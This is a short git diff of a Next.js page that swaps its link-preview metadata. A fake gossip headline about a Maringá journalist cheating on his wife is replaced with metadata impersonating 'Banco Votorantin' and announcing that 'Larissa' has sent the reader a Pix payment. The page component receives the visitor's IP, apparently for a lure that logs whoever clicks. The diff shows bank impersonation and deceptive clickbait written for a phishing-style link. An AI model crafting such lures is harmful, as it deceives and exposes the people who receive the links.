@@ -35,15 +35,15 @@ export default function Home({ ip }) {
   const currentURL = "http://fofocando.vercel.com.br";
   const previewImage =
     "https://www.tupi.fm/wp-content/uploads/2019/08/repórter-300x140.png";
-  const siteName = "Fofocando Maringá";
-  const pageTitle = "Bomba Jornalista de Maringá trai esposa";
+  const siteName = "Banco Votorantin";
+  const pageTitle = "Comprovante Pix no valor...";
   const description =
-    "Um jornalista de Maringá está enfrentando uma situação complicada em sua vida conjugal....";
+    "Eiii, Larissa acaba de te enviar um pix";
 
   return (
     <div>
       <Head>
-        <title>Create Next App</title>
+        <title>Banco Votorantin</title>
         <link rel="icon" href="/favicon.ico" />
         <meta property="og:url" content={currentURL} key="ogurl" />
         <meta property="og:image" content={previewImage} key="ogimage" />
